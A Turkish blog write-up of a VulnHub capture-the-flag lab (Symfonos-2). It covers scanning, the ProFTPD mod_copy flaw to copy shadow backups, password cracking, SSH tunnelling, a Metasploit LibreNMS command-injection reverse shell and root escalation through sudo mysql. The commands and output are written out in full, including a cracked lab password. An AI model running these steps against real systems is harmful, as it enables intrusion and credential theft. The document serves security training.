---
title: "VULNHUB Symfonos-2 Write Up"
date: 2020-10-06T11:25:38+03:00
draft: false
toc: true
images:
tags: [Vulnhub,write-up,Ssh Tunelling,Port Forwarding,Metasploit,smb,ftp,OSCP,CVE:2015-3306] 
categories: [write-up]
author : "Barcode"
Description : "Merhaba, Bu yazımda sizlere [VULNHUB](https://www.vulnhub.com/entry/symfonos-2,331/) 'da yer alan Symfonos serisinin OSCP tadında olan 2. makinasının çözümünden bahsedeceğim. Keyifli okumalar..."
cover : images/vulnhub/symfonos2/cover.png
  
---
Merhaba, Bu yazımda sizlere [VULNHUB](https://www.vulnhub.com/entry/symfonos-2,331/) 'da yer alan Symfonos serisinin OSCP tadında olan 2. makinasının çözümünden bahsedeceğim. Keyifli okumalar...

## 1. Keşif Aşaması

Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.

```bash
netdiscover -i eth1
```

{{< image src="/images/vulnhub/symfonos2/netdiscover.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Her zaman olduğu gibi nmap ile tüm portlar ve açık olan portlarda çalışan servisler tespit edilir.

```bash
sudo nmap -sV -sC -p- 192.168.56.115
```

```terminal
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-05 06:48 CDT
Nmap scan report for 192.168.56.115 (192.168.56.115)
Host is up (0.00012s latency).
Not shown: 65530 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.5
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 9d:f8:5f:87:20:e5:8c:fa:68:47:7d:71:62:08:ad:b9 (RSA)
|   256 04:2a:bb:06:56:ea:d1:93:1c:d2:78:0a:00:46:9d:85 (ECDSA)
|_  256 28:ad:ac:dc:7e:2a:1c:f6:4c:6b:47:f2:d6:22:5b:52 (ED25519)
80/tcp  open  http        WebFS httpd 1.21
|_http-server-header: webfs/1.21
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:FD:79:D9 (Oracle VirtualBox virtual NIC)
Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 4h39m59s, deviation: 2h53m12s, median: 2h59m59s
|_nbstat: NetBIOS name: SYMFONOS2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos2
|   NetBIOS computer name: SYMFONOS2\x00
|   Domain name: \x00
|   FQDN: symfonos2
|_  System time: 2020-10-05T09:48:38-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-10-05T14:48:38
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.90 seconds
```
İlk göze çarpan 139 ve 445 numaralı portlarda çalışan Samba ve 21 numaralı portta çalışan ftp servisidir. 

Samba servisinde paylaşıma açık olan dosya ve klasörler *smbclient* ile kontrol edilir. Paylaşıma açık olan dizin içeriği kontrol edilir. log.txt dosyası indirilir ve incelenir.

```terminal
smbclient  -L //192.168.56.115/
smbclient  //192.168.56.114/anonymous
```
{{< image src="/images/vulnhub/symfonos2/smb.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Log.txt dosyasında 2 adet önemli bilgi yer almaktadır.
1. shadow dosyasının yedeklendiği dizin

{{< image src="/images/vulnhub/symfonos2/info1.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

2. Samba ile paylaşıma açılan dizin yolu

{{< image src="/images/vulnhub/symfonos2/info2.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

ProFTPD 1.3.5 sürümünde *CVE:2015-3306* kodu ile login olmadan dosya kopyalama zafiyeti bulunmaktadır.

{{< image src="/images/vulnhub/symfonos2/ftpexp.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

ftp portuna bağlanırlır. Shadow.bak ve passwd dosyaları şifresiz erişime açık olan backups klasörüne kopyalanır. Samba servisinden dosyalar indirilerek hesap şifreleri sözlük saldırısı yapılarak elde edilir.

 *Not: Shell almak için web dizinine dosya upload edilemeye çalışıldığında hata ile karşılaşılmıştır. Web dizini root yetkisindedir.*

{{< image src="/images/vulnhub/symfonos2/ftp.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Unshadow aracı ile elde edilen hesap bilgileri sözlük saldırısı için uygun formata getirilir.*(shadow.bak -> pass olarak kayıt edilmiştir.)*
```bash
unshadow passwd.bak pass > crack
```
John ile sözlük saldırısı yapılır. **aeolus** kullancısının hesap parolası elde edilir.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt crack 
```
{{< image src="/images/vulnhub/symfonos2/hydra.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

## 2. Erişim Sağlanması

Aeolus kullanıcısı bilgileri ile ssh bağlantısı yapılır.
```bash
ssh aeolus@192.168.56.115
```

{{< image src="/images/vulnhub/symfonos2/ssh.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

## 3. Yetki Yükseltme

LinEnum betiği ile sistem hakkında bilgi toplanır. Network bağlantıları dikkatli incelendiğinde 3306, 8080 ve 25 numaralı portlar localde çalışan uygulamalara ait açık portlardır. 25. portta Exim mail servisi, 3306 portta mysql servisi ve 8080 portunda Apache web servisi çalışmaktadır. 

Portlar dışarıya açık olmadığından portlara erişim **ssh tüneli** ile sağlanmalıdır. Bu kapsamda shh ile port yönlendirme yapılır. Kendi bilgisayarımızda 8080 portu ssh ile bağlanılılan makinada 8080 portuna yönlendirilmiştir.

{{< image src="/images/vulnhub/symfonos2/network.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

```bash
ssh  -L  8080:localhost:8080 aeolus@192.168.56.115
```
Bağlantıdan sonra tarayıcından *localhost:8080* adresine istek atılarak çalışan apache servisine bağlanılır. LibreNMS adında ağ izleme aracı çalışmaktadır. aeolus kullanıcısına ait bilgiler ile giriş yapılır.



{{< image src="/images/vulnhub/symfonos2/libre.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Metasploit aracı içerisinde yazılıma ait 2 adet exploit bulunmaktadır. 

```terminal
msf6 > search librenms

Matching Modules
================

   #  Name                                             Disclosure Date  Rank       Check  Description
   -  ----                                             ---------------  ----       -----  -----------
   0  exploit/linux/http/librenms_addhost_cmd_inject   2018-12-16       excellent  No     LibreNMS addhost Command Injection
   1  exploit/linux/http/librenms_collectd_cmd_inject  2019-07-15       excellent  Yes    LibreNMS Collectd Command Injection

```
İlk sıradaki exploit seçilir. Ayarlara bakılır.
```terminal
msf6 > use 0
[*] Using configured payload cmd/unix/reverse
msf6 exploit(linux/http/librenms_addhost_cmd_inject) > options

Module options (exploit/linux/http/librenms_addhost_cmd_inject):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       Password for LibreNMS
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base LibreNMS path
   USERNAME                    yes       User name for LibreNMS
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux
```
Gerekli parametreler girilerek exploit çalıştırılır.
```terminal
 > set username aeolus
 > set rhosts 127.0.0.1
 > set rport 8080
 > set password sergioteamo
 > set lhost 192.168.56.105
```

Exploit çalıştırıldığında Cronus adlı kullanıcı ile terminal bağlantısı sağlanır. 

*Not: LinEnum ile yapılan keşifte de 8080 portunda çalışan Apache servisi Cronus kullanıcısı yetkisi ile çalışmaktadır.*

```terminal
msf6 exploit(linux/http/librenms_addhost_cmd_inject) > run

[*] Started reverse TCP double handler on 192.168.56.105:4444 
[*] Successfully logged into LibreNMS. Storing credentials...
[+] Successfully added device with hostname LLOYBQ
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[+] Successfully deleted device with hostname LLOYBQ and id #1
[*] Command: echo 4bqnipl207sgGUKw;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "4bqnipl207sgGUKw\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (192.168.56.105:4444 -> 192.168.56.115:57248) at 2020-10-05 14:39:26 -0500


id
uid=1001(cronus) gid=1001(cronus) groups=1001(cronus),999(librenms)
```

Sistem hakkında cronus kullanıcısı yetkileri ile tekrar bilgi toplamak için LinEnum betiği çalıştırılabilir. Ben genelde sistemde ilk olarak sudo yetkilerini kontrol ederim. Kontrol sonucunda mysql uygulamasının root yetkisi ile çalıştırılabildiği görülmektedir.

```bash
sudo -l
Matching Defaults entries for cronus on symfonos2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cronus may run the following commands on symfonos2:
    (root) NOPASSWD: /usr/bin/mysql
```

`sudo mysql -e '\! /bin/sh'` komutu kullanılarak root yetkisi ile terminal bağlantısı sağlanır. 

```bash
id
uid=0(root) gid=0(root) groups=0(root)
ls -lsa /root
total 28
4 drwx------  4 root root 4096 Jul 18  2019 .
4 drwxr-xr-x 22 root root 4096 Jul 18  2019 ..
0 lrwxrwxrwx  1 root root    9 Jul 18  2019 .bash_history -> /dev/null
4 -rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
4 drwxr-xr-x  3 root root 4096 Jul 18  2019 .config
4 drwxr-xr-x  3 root root 4096 Jul 18  2019 .local
4 -rw-r--r--  1 root root  148 Aug 17  2015 .profile
4 -rw-------  1 root root 1444 Jul 18  2019 proof.txt
bash -i
bash: cannot set terminal process group (514): Inappropriate ioctl for device
bash: no job control in this shell
root@symfonos2:/opt/librenms/html#
```
Proof.txt dosyası okunarak makina çözümleme işlemi tamalanır.

{{< image src="/images/vulnhub/symfonos2/flag.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

